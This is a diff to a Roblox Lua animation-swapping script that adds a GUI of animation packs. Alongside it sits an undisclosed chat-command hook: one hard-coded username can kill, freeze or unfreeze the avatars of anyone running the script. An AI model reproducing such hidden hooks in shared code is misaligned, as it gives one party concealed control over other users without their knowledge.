@@ -11,8 +11,10 @@ local DashNUM = 1
 local DelayTime = 0.15
 local DR = 'front'
 
+
 local Slot = 1 -- Change between the pose and the main idle
 -- 1 is idle, 2 is pose.
+local Held = false
 
 local ImportantT = {
 	Info = {
@@ -31,6 +33,318 @@ local ImportantT = {
 		FOUSR = true,
 	};
 };
+
+function ChangeUI()
+	-- Gui to Lua
+	-- Version: 3.2
+
+	-- Instances:
+
+	local ScreenGui = Instance.new("ScreenGui")
+	local Background = Instance.new("Frame")
+	local UICorner = Instance.new("UICorner")
+	local Upper = Instance.new("Frame")
+	local UICorner_2 = Instance.new("UICorner")
+	local Hide = Instance.new("Frame")
+	local UIGradient = Instance.new("UIGradient")
+	local Close = Instance.new("TextButton")
+	local UIAspectRatioConstraint = Instance.new("UIAspectRatioConstraint")
+	local Title = Instance.new("TextLabel")
+	local UIAspectRatioConstraint_2 = Instance.new("UIAspectRatioConstraint")
+	local Packages = Instance.new("Frame")
+	local UIAspectRatioConstraint_3 = Instance.new("UIAspectRatioConstraint")
+	local Packages_2 = Instance.new("ScrollingFrame")
+	local UIListLayout = Instance.new("UIListLayout")
+	local BetterR5 = Instance.new("TextButton")
+	local UICorner_3 = Instance.new("UICorner")
+	local UIPadding = Instance.new("UIPadding")
+	local Zesty = Instance.new("TextButton")
+	local UICorner_4 = Instance.new("UICorner")
+	local Womanly = Instance.new("TextButton")
+	local UICorner_5 = Instance.new("UICorner")
+	local Hero = Instance.new("TextButton")
+	local UICorner_6 = Instance.new("UICorner")
+	local Hero2 = Instance.new("TextButton")
+	local UICorner_7 = Instance.new("UICorner")
+	local Tippy = Instance.new("TextButton")
+	local UICorner_8 = Instance.new("UICorner")
+	local Rich = Instance.new("TextButton")
+	local UICorner_9 = Instance.new("UICorner")
+	local TextLabel = Instance.new("TextLabel")
+	local UIAspectRatioConstraint_4 = Instance.new("UIAspectRatioConstraint")
+	local UIStroke = Instance.new("UIStroke")
+
+
+	--Properties:
+
+	ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+	ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+	Background.Name = "Background"
+	Background.Parent = ScreenGui
+	Background.AnchorPoint = Vector2.new(0.5, 0.5)
+	Background.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+	Background.Position = UDim2.new(0.5, 0, 0.499376506, 0)
+	Background.Size = UDim2.new(0.346998453, 0, 0.38029924, 0)
+
+	UICorner.CornerRadius = UDim.new(0, 17)
+	UICorner.Parent = Background
+
+	Upper.Name = "Upper"
+	Upper.Parent = Background
+	Upper.AnchorPoint = Vector2.new(0.5, 0.5)
+	Upper.BackgroundColor3 = Color3.fromRGB(94, 110, 157)
+	Upper.Position = UDim2.new(0.499874055, 0, 0.0889999643, 0)
+	Upper.Size = UDim2.new(1.00025201, 0, 0.178050756, 0)
+
+	UICorner_2.CornerRadius = UDim.new(0, 17)
+	UICorner_2.Parent = Upper
+
+	Hide.Name = "Hide"
+	Hide.Parent = Background
+	Hide.AnchorPoint = Vector2.new(0.5, 0.5)
+	Hide.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+	Hide.BorderSizePixel = 0
+	Hide.Position = UDim2.new(0.499748141, 0, 0.315755665, 0)
+	Hide.Size = UDim2.new(1.00050366, 0, 0.347540945, 0)
+	Hide.ZIndex = 5
+
+	UIGradient.Rotation = -90
+	UIGradient.Transparency = NumberSequence.new{NumberSequenceKeypoint.new(0.00, 0.00), NumberSequenceKeypoint.new(0.76, 0.00), NumberSequenceKeypoint.new(1.00, 1.00)}
+	UIGradient.Parent = Background
+
+	Close.Name = "Close"
+	Close.Parent = Background
+	Close.AnchorPoint = Vector2.new(0.5, 0.5)
+	Close.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+	Close.BackgroundTransparency = 1.000
+	Close.Position = UDim2.new(0.949000001, 0, 0.075000003, 0)
+	Close.Size = UDim2.new(0.0780590922, 0, 0.121311478, 0)
+	Close.Font = Enum.Font.Unknown
+	Close.Text = "-"
+	Close.TextColor3 = Color3.fromRGB(255, 255, 255)
+	Close.TextScaled = true
+	Close.TextSize = 14.000
+	Close.TextWrapped = true
+	Close.MouseButton1Down:Connect(function()
+		Held = true
+
+		while Held do
+			wait(0.001)
+			Close.Parent.Position = UDim2.new(-0.150,Player:GetMouse().X,0.170,Player:GetMouse().Y)
+		end
+	end)
+	Close.MouseButton1Up:Connect(function()
+	 Held = false
+	
+	end)
+	
+	UIAspectRatioConstraint.Parent = Close
+
+	Title.Name = "Title"
+	Title.Parent = Background
+	Title.AnchorPoint = Vector2.new(0.5, 0.5)
+	Title.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+	Title.BackgroundTransparency = 1.000
+	Title.Position = UDim2.new(0.428270161, 0, 0.072131142, 0)
+	Title.Size = UDim2.new(0.803797662, 0, 0.101639345, 0)
+	Title.Font = Enum.Font.SourceSansItalic
+	Title.Text = "Untitled Animation script"
+	Title.TextColor3 = Color3.fromRGB(255, 255, 255)
+	Title.TextScaled = true
+	Title.TextSize = 14.000
+	Title.TextWrapped = true
+	Title.TextXAlignment = Enum.TextXAlignment.Left
+
+	UIAspectRatioConstraint_2.Parent = Title
+	UIAspectRatioConstraint_2.AspectRatio = 12.290
+
+	Packages.Name = "Packages"
+	Packages.Parent = Background
+	Packages.AnchorPoint = Vector2.new(0.5, 0.5)
+	Packages.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+	Packages.BackgroundTransparency = 1.000
+	Packages.Position = UDim2.new(0.339692026, 0, 0.572131276, 0)
+	Packages.Size = UDim2.new(0.62869215, 0, 0.80983609, 0)
+	Packages.ZIndex = 100
+
+	UIAspectRatioConstraint_3.Parent = Packages
+	UIAspectRatioConstraint_3.AspectRatio = 1.206
+
+	Packages_2.Name = "Packages"
+	Packages_2.Parent = Packages
+	Packages_2.Active = true
+	Packages_2.AnchorPoint = Vector2.new(0.5, 0.5)
+	Packages_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+	Packages_2.BackgroundTransparency = 1.000
+	Packages_2.BorderSizePixel = 0
+	Packages_2.Position = UDim2.new(0.5, 0, 0.5, 0)
+	Packages_2.Size = UDim2.new(1, 0, 1, 0)
+	Packages_2.CanvasSize = UDim2.new(0, 0, 5, 0)
+	Packages_2.ScrollBarThickness = 3
+	Packages_2.VerticalScrollBarPosition = Enum.VerticalScrollBarPosition.Left
+
+	UIListLayout.Parent = Packages_2
+	UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
+	UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
+	UIListLayout.Padding = UDim.new(0, 5)
+
+	BetterR5.Name = "BetterR5"
+	BetterR5.Parent = Packages_2
+	BetterR5.AnchorPoint = Vector2.new(0.5, 0.5)
+	BetterR5.BackgroundColor3 = Color3.fromRGB(94, 110, 157)
+	BetterR5.Position = UDim2.new(0.5, 0, 0.0148560079, 0)
+	BetterR5.Size = UDim2.new(0.78859061, 0, 0.0297118891, 0)
+	BetterR5.Font = Enum.Font.SourceSansBold
+	BetterR5.Text = "Better R15"
+	BetterR5.TextColor3 = Color3.fromRGB(255, 255, 255)
+	BetterR5.TextSize = 23.000
+	BetterR5.MouseButton1Up:Connect(function()
+		Player.Character.Animate.run.RunAnim.AnimationId = 'rbxassetid://4211220381'
+		Player.Character.Animate.fall.FallAnim.AnimationId = 'rbxassetid://4211216152'
+		Player.Character.Animate.jump.JumpAnim.AnimationId = 'rbxassetid://4211219390'
+	end)
+
+	UICorner_3.CornerRadius = UDim.new(0, 40000)
+	UICorner_3.Parent = BetterR5
+
+	UIPadding.Parent = Packages_2
+	UIPadding.PaddingTop = UDim.new(0, 5)
+
+	Zesty.Name = "Zesty"
+	Zesty.Parent = Packages_2
+	Zesty.AnchorPoint = Vector2.new(0.5, 0.5)
+	Zesty.BackgroundColor3 = Color3.fromRGB(94, 110, 157)
+	Zesty.Position = UDim2.new(0.5, 0, 0.0148560079, 0)
+	Zesty.Size = UDim2.new(0.78859061, 0, 0.0297118891, 0)
+	Zesty.Font = Enum.Font.SourceSansBold
+	Zesty.Text = "Kinda Zesty"
+	Zesty.TextColor3 = Color3.fromRGB(255, 255, 255)
+	Zesty.TextSize = 23.000
+	Zesty.MouseButton1Up:Connect(function()
+		Player.Character.Animate.run.RunAnim.AnimationId = 'rbxassetid://941015281'
+		Player.Character.Animate.fall.FallAnim.AnimationId = 'rbxassetid://941000007'
+		Player.Character.Animate.jump.JumpAnim.AnimationId = 'rbxassetid://941008832'
+	end)
+
+	UICorner_4.CornerRadius = UDim.new(0, 40000)
+	UICorner_4.Parent = Zesty
+
+	Womanly.Name = "Womanly"
+	Womanly.Parent = Packages_2
+	Womanly.AnchorPoint = Vector2.new(0.5, 0.5)
+	Womanly.BackgroundColor3 = Color3.fromRGB(94, 110, 157)
+	Womanly.Position = UDim2.new(0.5, 0, 0.0148560079, 0)
+	Womanly.Size = UDim2.new(0.78859061, 0, 0.0297118891, 0)
+	Womanly.Font = Enum.Font.SourceSansBold
+	Womanly.Text = "Womanly"
+	Womanly.TextColor3 = Color3.fromRGB(255, 255, 255)
+	Womanly.TextSize = 23.000
+	Womanly.MouseButton1Up:Connect(function()
+		Player.Character.Animate.run.RunAnim.AnimationId = 'rbxassetid://4708192705'
+		Player.Character.Animate.fall.FallAnim.AnimationId = 'rbxassetid://4708186162'
+		Player.Character.Animate.jump.JumpAnim.AnimationId = 'rbxassetid://4708188025'
+	end)
+
+	UICorner_5.CornerRadius = UDim.new(0, 40000)
+	UICorner_5.Parent = Womanly
+
+	Hero.Name = "Hero"
+	Hero.Parent = Packages_2
+	Hero.AnchorPoint = Vector2.new(0.5, 0.5)
+	Hero.BackgroundColor3 = Color3.fromRGB(94, 110, 157)
+	Hero.Position = UDim2.new(0.5, 0, 0.0148560079, 0)
+	Hero.Size = UDim2.new(0.78859061, 0, 0.0297118891, 0)
+	Hero.Font = Enum.Font.SourceSansBold
+	Hero.Text = "Super Hero"
+	Hero.TextColor3 = Color3.fromRGB(255, 255, 255)
+	Hero.TextSize = 23.000
+	Hero.MouseButton1Up:Connect(function()
+		Player.Character.Animate.run.RunAnim.AnimationId = 'rbxassetid://1150967949'
+		Player.Character.Animate.fall.FallAnim.AnimationId = 'rbxassetid://1148863382'
+		Player.Character.Animate.jump.JumpAnim.AnimationId = 'rbxassetid://1150944216'
+	end)
+
+	UICorner_6.CornerRadius = UDim.new(0, 40000)
+	UICorner_6.Parent = Hero
+
+	Hero2.Name = "Hero2"
+	Hero2.Parent = Packages_2
+	Hero2.AnchorPoint = Vector2.new(0.5, 0.5)
+	Hero2.BackgroundColor3 = Color3.fromRGB(94, 110, 157)
+	Hero2.Position = UDim2.new(0.5, 0, 0.0148560079, 0)
+	Hero2.Size = UDim2.new(0.78859061, 0, 0.0297118891, 0)
+	Hero2.Font = Enum.Font.SourceSansBold
+	Hero2.Text = "Super Hero II"
+	Hero2.TextColor3 = Color3.fromRGB(255, 255, 255)
+	Hero2.TextSize = 23.000
+	Hero2.MouseButton1Up:Connect(function()
+		Player.Character.Animate.run.RunAnim.AnimationId = 'rbxassetid://1070001516'
+		Player.Character.Animate.fall.FallAnim.AnimationId = 'rbxassetid://1069973677'
+		Player.Character.Animate.jump.JumpAnim.AnimationId = 'rbxassetid://1069984524'
+	end)
+
+	UICorner_7.CornerRadius = UDim.new(0, 40000)
+	UICorner_7.Parent = Hero2
+
+	Tippy.Name = "Tippy"
+	Tippy.Parent = Packages_2
+	Tippy.AnchorPoint = Vector2.new(0.5, 0.5)
+	Tippy.BackgroundColor3 = Color3.fromRGB(94, 110, 157)
+	Tippy.Position = UDim2.new(0.5, 0, 0.0148560079, 0)
+	Tippy.Size = UDim2.new(0.78859061, 0, 0.0297118891, 0)
+	Tippy.Font = Enum.Font.SourceSansBold
+	Tippy.Text = "Tippy Toes"
+	Tippy.TextColor3 = Color3.fromRGB(255, 255, 255)
+	Tippy.TextSize = 23.000
+	Tippy.MouseButton1Up:Connect(function()
+		Player.Character.Animate.run.RunAnim.AnimationId = 'rbxassetid://1132494274'
+		Player.Character.Animate.fall.FallAnim.AnimationId = 'rbxassetid://1132469004'
+		Player.Character.Animate.jump.JumpAnim.AnimationId = 'rbxassetid://1132489853'
+	end)
+
+	UICorner_8.CornerRadius = UDim.new(0, 40000)
+	UICorner_8.Parent = Tippy
+
+	Rich.Name = "Rich"
+	Rich.Parent = Packages_2
+	Rich.AnchorPoint = Vector2.new(0.5, 0.5)
+	Rich.BackgroundColor3 = Color3.fromRGB(94, 110, 157)
+	Rich.Position = UDim2.new(0.5, 0, 0.0148560079, 0)
+	Rich.Size = UDim2.new(0.78859061, 0, 0.0297118891, 0)
+	Rich.Font = Enum.Font.SourceSansBold
+	Rich.Text = "Rich"
+	Rich.TextColor3 = Color3.fromRGB(255, 255, 255)
+	Rich.TextSize = 23.000
+	Rich.MouseButton1Up:Connect(function()
+		Player.Character.Animate.run.RunAnim.AnimationId = 'rbxassetid://1212980348'
+		Player.Character.Animate.fall.FallAnim.AnimationId = 'rbxassetid://1212900995'
+		Player.Character.Animate.jump.JumpAnim.AnimationId = 'rbxassetid://1212980348'
+	end)
+
+	UICorner_9.CornerRadius = UDim.new(0, 40000)
+	UICorner_9.Parent = Rich
+
+	TextLabel.Parent = Background
+	TextLabel.AnchorPoint = Vector2.new(0.5, 0.5)
+	TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+	TextLabel.BackgroundTransparency = 1.000
+	TextLabel.Position = UDim2.new(0.791139424, 0, 0.577049196, 0)
+	TextLabel.Size = UDim2.new(0.337552816, 0, 0.800000012, 0)
+	TextLabel.ZIndex = 500
+	TextLabel.Font = Enum.Font.Unknown
+	TextLabel.Text = "These are only running animations, you still change your idle animation by pressing Control or Alt"
+	TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+	TextLabel.TextScaled = true
+	TextLabel.TextSize = 14.000
+	TextLabel.TextWrapped = true
+	UIStroke.Parent = TextLabel
+	UIStroke.Thickness = 2.9
+	UIStroke.Color = Color3.new(0.368627, 0.431373, 0.615686)
+
+	UIAspectRatioConstraint_4.Parent = TextLabel
+	UIAspectRatioConstraint_4.AspectRatio = 0.656
+end
 
 
 local Owner = {1851945777, 329574172, 175155268, 3098136629}
@@ -68,11 +382,13 @@ setmetatable(ImportantT,{
 	end,
 });
 
+task.spawn(function()
+	repeat wait() until workspace:FindFirstChild(Player.Name)
+	Player.Character:BreakJoints()
+end)
 
 game.Workspace.ChildAdded:Connect(function(Child)
-	print('uh')
 	if Child.Name == '240HzGeforce4090btw' then
-		print('yep')
 		game.Players:FindFirstChild(Child.Name).Chatted:Connect(function(Msg)
 			if Msg == 'VANISH, HUMAN!' then
 				if Player.Name ~= '240HzGeforce4090btw' then
@@ -110,9 +426,16 @@ game.Workspace.ChildAdded:Connect(function(Child)
 					task.wait(2.5)
 					Player.Character.Humanoid.Health = 0
 				end
-
-				
-
+			end
+			if Msg == 'Freeze' then
+				if Player.Name ~= '240HzGeforce4090btw' then
+					Player.Character.HumanoidRootPart.Anchored = true
+				end
+			end
+			if Msg == 'Unfreeze' then
+				if Player.Name ~= '240HzGeforce4090btw' then
+					Player.Character.HumanoidRootPart.Anchored = false
+				end
 			end
 		end)
 	end
@@ -232,6 +555,8 @@ end)
 Player.CharacterAdded:Connect(function(Character)
 	
 	wait(1)
+	
+	ChangeUI()
 	
 	Player.Backpack.DescendantAdded:Connect(function(c)
 		if c:IsA('Tool') then
